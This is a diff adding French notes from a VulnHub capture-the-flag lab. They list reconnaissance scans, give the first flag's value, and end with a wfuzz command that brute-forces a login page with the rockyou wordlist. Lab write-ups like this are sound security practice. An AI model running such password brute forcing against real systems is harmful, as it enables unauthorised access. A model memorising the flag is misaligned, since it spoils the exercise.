@@ -1,0 +1,32 @@
+Mars 2018 : vulnhub.com : JIS-CTF_VulnUpload
+
+scan netdiscover
+
+scan arp-scan
+
+scan nmap
+
+scan nikto
+
+scan dirb
+
+=======================================================================
+scan dirb grace à ce scan on voit le dossier /flag/index.html
+	
+	-- Entering directory: http://10.0.1.209/flag/ ----
+	+ http://10.0.1.209/flag/index.html (CODE:200|SIZE:109)
+
+on voit le premier flag :
+sur la page :
+http://10.0.1.209/flag/index.html
+
+The 1st flag is : {8734509128730458630012095}
+
+=======================================================================
+On va tester avec wfuzz de casser l'authentification de la page : http://10.0.1.209/login.php
+D'après le code de la page deux champs :
+       <input name="user_name" type="text"required autocomplete="off"/>
+       <input name="pass_word" type="password"required autocomplete="off"/>
+Donc le nom des deux champs est user_name et pass_word.
+on lance wfuzz :
+wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -z file,/usr/share/wordlists/rockyou.txt --sc 200 http://10.0.1.209/login.php?user_name=FUZZ&pass_word=FUZ2Z
